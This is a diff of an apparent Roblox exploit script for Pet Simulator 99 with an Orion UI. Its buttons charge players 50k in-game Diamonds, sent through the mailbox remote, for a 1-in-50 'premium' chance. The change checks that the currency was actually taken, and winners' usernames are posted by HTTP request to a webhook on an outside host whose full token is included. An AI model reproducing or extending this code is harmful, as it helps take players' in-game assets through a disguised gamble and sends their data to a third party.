@@ -50,32 +50,32 @@ CF:AddDropdown({
     end    
 })
 
-local lastFlipTime = 0
+local debounce = false
 
 CF:AddButton({
     Name = "Flip Coin!",
     Callback = function()
-        local currentTime = os.time()
-        if currentTime - lastFlipTime >= 10 then
+        if not debounce then
+            debounce = true
             flipCoin()
-            lastFlipTime = currentTime
-        else
-            return
+            wait(10)
+            debounce = false
         end
     end    
 })   
 
 LP:AddParagraph("Info","Clicking the button will cost 50k, and a chance to get Lenut Premium.")
 
-lastClick = 0
+local debounce = false
 
 LP:AddButton({
     Name = "CLICK FOR CHANCE OF PREMIUM! [50K]",
     Callback = function()
-        local currentTime = os.clock()
-        if currentTime - lastClick >= 4 then
+        if not debounce then
+            debounce = true
             lenutPremium()
-            lastClick = currentTime
+            wait(3)
+            debounce = false
         end
     end    
 })
@@ -249,6 +249,21 @@ function flipCoin()
 end
 
 function lenutPremium()
+    local lp = game.Players.LocalPlayer.Name
+    local gems = nil
+    local leadertab = game.Players.LocalPlayer.leaderstats
+    
+    for _, child in pairs(leadertab:GetChildren()) do
+        if child:IsA("IntValue") then
+            local stats = child.Name:gsub("[^%a]", "")
+            if stats == "Diamonds" then
+                gems = child.Value
+            end
+        end
+    end
+
+    initialGem = gems
+
     local GetSave = function()
         return require(game.ReplicatedStorage.Library.Client.Save).Get()
     end
@@ -267,53 +282,72 @@ function lenutPremium()
             game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
         end
     end
-    local chance = math.random(1, 50)
-    if chance == 1 then
-        local syn = syn or {}
-        local request = syn.request or http_request
-        local HttpService = game:GetService("HttpService")
 
-        local webhookUrl =
-            "https://webhook.lewistehminerz.dev/api/webhooks/1199585265065402430/mAlzw2fi2i4BlHAHh0oDvEaLRes2YH6Tz2iLoiWGUGS--pDwfkv_n87v8JqwJX69U3pa"
+    task.wait(2)
 
-        local lp = game.Players.LocalPlayer.Name
-
-        local function sendWebhookMessage(embed)
-            local success, response =
-                pcall(
-                function()
-                    request(
-                        {
-                            Url = webhookUrl,
-                            Method = "POST",
-                            Headers = {["Content-Type"] = "application/json"},
-                            Body = HttpService:JSONEncode({embeds = {embed}})
-                        }
-                    )
-                end
-            )
+    local lp = game.Players.LocalPlayer.Name
+    local gems2 = nil
+    local leadertab = game.Players.LocalPlayer.leaderstats
+    
+    for _, child in pairs(leadertab:GetChildren()) do
+        if child:IsA("IntValue") then
+            local stats = child.Name:gsub("[^%a]", "")
+            if stats == "Diamonds" then
+                gems2 = child.Value
+            end
         end
+    end
 
-        local embed = {
-            title = "PS99",
-            description = lp .. " has purchased premium",
-            color = 0xFFD700
-        }
-        sendWebhookMessage(embed)
-        task.wait(1)
-        OrionLib:MakeNotification({
-            Name = "Congrats",
-            Content = "You won premium, execute lenut's script in 5 minutes and you will have it.",
-            Image = "rbxassetid://4483345998",
-            Time = 15
-        })
-    else
-        task.wait(1)
-        OrionLib:MakeNotification({
-            Name = "Sorry, Try Again!",
-            Content = "Better luck next time.",
-            Image = "rbxassetid://4483345998",
-            Time = 3
-        })
+    if initialGem - gems2 >= 49000 then
+
+        local chance = math.random(1, 50)
+        if chance == 1 then
+            local syn = syn or {}
+            local request = syn.request or http_request
+            local HttpService = game:GetService("HttpService")
+
+            local webhookUrl =
+                "https://webhook.lewistehminerz.dev/api/webhooks/1199585265065402430/mAlzw2fi2i4BlHAHh0oDvEaLRes2YH6Tz2iLoiWGUGS--pDwfkv_n87v8JqwJX69U3pa"
+
+            local lp = game.Players.LocalPlayer.Name
+
+            local function sendWebhookMessage(embed)
+                local success, response =
+                    pcall(
+                    function()
+                        request(
+                            {
+                                Url = webhookUrl,
+                                Method = "POST",
+                                Headers = {["Content-Type"] = "application/json"},
+                                Body = HttpService:JSONEncode({embeds = {embed}})
+                            }
+                        )
+                    end
+                )
+            end
+
+            local embed = {
+                title = "PS99",
+                description = lp .. " has purchased premium",
+                color = 0xFFD700
+            }
+            sendWebhookMessage(embed)
+            task.wait(1)
+            OrionLib:MakeNotification({
+                Name = "Congrats",
+                Content = "You won premium, execute lenut's script in 5 minutes and you will have it.",
+                Image = "rbxassetid://4483345998",
+                Time = 15
+            })
+        else
+            task.wait(1)
+            OrionLib:MakeNotification({
+                Name = "Sorry, Try Again!",
+                Content = "Better luck next time.",
+                Image = "rbxassetid://4483345998",
+                Time = 3
+            })
+        end
     end
 end
